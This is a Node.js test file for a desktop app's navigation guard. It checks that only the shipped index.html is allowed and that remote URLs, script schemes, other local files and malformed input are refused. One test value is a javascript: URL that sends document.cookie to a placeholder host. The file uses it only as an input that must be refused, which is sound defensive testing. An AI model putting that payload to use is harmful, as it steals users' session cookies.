'use strict';

// Navigation policy. window.soda is granted to whatever document occupies the window — mpv
// control, torrent add, cast load, local file reads — so letting the renderer navigate anywhere
// hands all of that to the destination. The app never navigates, so the only allowed target is
// the exact document we shipped.

const { test } = require('node:test');
const assert = require('assert');
const path = require('path');
const { pathToFileURL } = require('url');
const { isAllowedNavigation, appDocumentUrl } = require('../src/main/nav-guard');

const INDEX = path.join(__dirname, '..', 'src', 'renderer', 'index.html');
const INDEX_URL = pathToFileURL(path.resolve(INDEX)).href;

test('the app document itself is allowed', () => {
  assert.ok(isAllowedNavigation(INDEX_URL, INDEX));
  assert.strictEqual(appDocumentUrl(INDEX), INDEX_URL);
});

test('the same file spelled differently is still allowed', () => {
  // Compared by resolved path, not by string, so an un-normalised spelling of the same document
  // does not get refused and break a legitimate reload.
  const messy = path.join(__dirname, '..', 'src', 'renderer', '..', 'renderer', 'index.html');
  assert.ok(isAllowedNavigation(pathToFileURL(messy).href, INDEX));
});

test('remote and script schemes are refused', () => {
  for (const u of ['https://example.invalid/', 'http://127.0.0.1:8080/',
    'javascript:fetch("//x/"+document.cookie)', 'data:text/html,<script>1</script>',
    'blob:file:///abc', 'about:blank', 'file:']) {
    assert.ok(!isAllowedNavigation(u, INDEX), u + ' must be refused');
  }
});

test('a different local file is refused', () => {
  // The realistic case: something persuades the renderer to load another local HTML file, which
  // would then inherit the whole preload bridge.
  const other = path.join(path.dirname(INDEX), 'evil.html');
  assert.ok(!isAllowedNavigation(pathToFileURL(other).href, INDEX));
  assert.ok(!isAllowedNavigation(pathToFileURL('/tmp/evil.html').href, INDEX));
});

test('traversal back to the app document is not a bypass of anything, but still resolves', () => {
  const viaTraversal = pathToFileURL(path.join(path.dirname(INDEX), 'sub', '..', 'index.html')).href;
  assert.ok(isAllowedNavigation(viaTraversal, INDEX), 'resolves to the same real file');
  const escaped = pathToFileURL(path.join(path.dirname(INDEX), '..', '..', 'package.json')).href;
  assert.ok(!isAllowedNavigation(escaped, INDEX), 'resolving elsewhere is refused');
});

test('query strings and fragments are refused', () => {
  assert.ok(!isAllowedNavigation(INDEX_URL + '?x=1', INDEX));
  assert.ok(!isAllowedNavigation(INDEX_URL + '#x', INDEX));
});

test('malformed input fails closed', () => {
  for (const bad of [null, undefined, '', 42, {}, [], 'not a url', 'file://%ZZ/x']) {
    assert.ok(!isAllowedNavigation(bad, INDEX), JSON.stringify(bad) + ' must be refused');
  }
});
